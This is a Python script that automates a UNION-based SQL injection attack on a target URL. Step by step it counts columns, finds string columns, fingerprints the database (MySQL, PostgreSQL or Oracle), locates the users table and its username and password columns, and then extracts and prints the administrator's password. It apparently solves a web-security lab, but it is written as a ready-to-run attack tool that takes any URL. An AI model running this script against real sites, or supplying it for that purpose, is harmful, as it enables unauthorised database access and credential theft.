import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


def perform_request(url, sql_payload):
    req = requests.get(url + sql_payload, verify=False, proxies=proxies)
    res = req.text
    return res


def get_cols(url):
    for i in range(1, 10):
        sql_payload = "'+order+by+%s--" % i

        if "Internal Server Error" in perform_request(url, sql_payload):
            return i - 1
        i += 1
    return False


def get_str_cols(url, num_cols):
    counter = 0

    for i in range(1, num_cols+1):
        payload_list = ['NULL'] * num_cols
        string = "'test_column_type'"
        payload_list[i-1] = string
        sql_payload = "'+union+select+" + ','.join(payload_list) + "--"
        sql_payload_oracle = "'+union+select+" + \
            ','.join(payload_list) + "+from+DUAL--"

        non_oracle = string.strip('\'') in perform_request(url, sql_payload)
        oracle = string.strip('\'') in perform_request(url, sql_payload_oracle)

        if (non_oracle or oracle):
            counter += 1

    return counter


def get_db_type(url, str_cols):
    payload_list = ['NULL'] * str_cols
    strings_list = ["@@version", "version()"]
    for i in range(0, 2):
        payload_list[0] = strings_list[i]
        sql_payload = "'+union+select+" + ','.join(payload_list) + "--"

        response = requests.get(
            url + sql_payload, verify=False, proxies=proxies)

        if (response.status_code == 200):
            return i
    return 2


def get_users_table(url, sql_payload):
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(string=re.compile('.*users.*'))
    users_table2 = soup.find(string=re.compile('^USERS.*'))
    if users_table:
        return users_table
    elif users_table2:
        return users_table2
    else:
        return False


def get_users_table_data(url, users_table, str_cols, db_type):
    payload_list = ['NULL'] * str_cols
    payload_list[0] = "column_name"

    if db_type in (0, 1):
        sql_payload = "'+UNION+SELECT+" + \
            ','.join(payload_list) + \
            "+FROM+information_schema.columns+WHERE+table_name+=+'%s'--" % users_table
        res = perform_request(url, sql_payload)
        soup = BeautifulSoup(res, 'html.parser')
        uname_col = soup.find(string=re.compile('.*username.*'))
        pass_col = soup.find(string=re.compile('.*password.*'))
        return uname_col, pass_col

    elif db_type == 2:
        sql_payload = "'+UNION+SELECT+" + \
            ','.join(payload_list) + \
            "+FROM+all_tab_columns+WHERE+table_name+=+'%s'--" % users_table
        res = perform_request(url, sql_payload)
        soup = BeautifulSoup(res, 'html.parser')
        uname_col = soup.find(string=re.compile('.*USERNAME.*'))
        pass_col = soup.find(string=re.compile('.*PASSWORD.*'))
        return uname_col, pass_col

    else:
        return False


def get_admin_creds(url, users_table, uname_col, pass_col):
    payload_list = ['NULL'] * str_cols
    payload_list[0] = "%s" % uname_col
    payload_list[1] = "%s" % pass_col

    sql_payload = "'+UNION+SELECT+" + \
        ','.join(payload_list) + \
        "+FROM+%s--" % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_pass = soup.find(string="administrator").findNext('td').contents[0]

    if admin_pass:
        return admin_pass
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s "www.example.com"' % sys.argv[0])
        sys.exit(0)

    try:
        num_cols = get_cols(url)
    except requests.exceptions.ProxyError:
        print("[-] Cannot connect to the proxy.")
        print("[+] Exiting...\n")
        sys.exit(0)

    print("[+] Fetching no. of columns...")

    if num_cols:
        print("[+] The no. of columns are", str(num_cols) + ".")
    else:
        print("[-] Cannot fetch no. of columns.")
        print("[+] Exiting...\n")
        sys.exit(0)

    print("\n[+] Fetching columns with datatype 'string'...")
    str_cols = get_str_cols(url, num_cols)

    if str_cols:
        print("[+] The no. of columns with datatype 'string' are " +
              str(str_cols) + ".")
    else:
        print("[-] Cannot find any columns with datatype 'string'.")
        print("[+] Exiting...\n")
        sys.exit(0)

    print("\n[+] Fetching the type of database...")
    db_list = ["MySQL/Microsoft", "Postgresql", "Oracle"]
    db_type = get_db_type(url, str_cols)
    if db_type != None:
        print("[+] The database type is " + db_list[db_type] + ".")
        print("\n[+] Looking for users table...")

        payload_list = ['NULL'] * str_cols
        payload_list[0] = "table_name"

        match db_type:
            case 0:
                sql_payload = "'+UNION+SELECT+" + \
                    ','.join(payload_list) + \
                    "+FROM+information_schema.tables--"
                users_table = get_users_table(url, sql_payload)
            case 1:
                sql_payload = "'+UNION+SELECT+" + \
                    ','.join(payload_list) + \
                    "+FROM+information_schema.tables--"
                users_table = get_users_table(url, sql_payload)
            case 2:
                sql_payload = "'+UNION+SELECT+" + \
                    ','.join(payload_list) + "+FROM+all_tables--"
                users_table = get_users_table(url, sql_payload)
            case _:
                users_table = False

        if users_table:
            print("[+] Found the users table:", users_table)

            uname_col, pass_col = get_users_table_data(
                url, users_table, str_cols, db_type)
            if uname_col and pass_col:
                print("\n[+] Found username column name:", uname_col)
                print("[+] Found password column name:", pass_col)

                admin_pass = get_admin_creds(
                    url, users_table, uname_col, pass_col)
                if admin_pass:
                    print("[+] Found password for administrator:", admin_pass)
                    print("[+] Exiting...\n")
                    sys.exit(0)
                else:
                    print("[-] Could not find password for administrator.")
                    print("[+] Exiting...\n")
                    sys.exit(0)
            else:
                print("[-] Could not find username and/or password columns.")
                print("[+] Exiting...\n")
                sys.exit(0)

        else:
            print("[-] Could not find users table.")
            print("[+] Exiting...\n")
            sys.exit(0)

    else:
        print("[-] Unable to find database type.")
        print("[+] Exiting...\n")
        sys.exit(0)
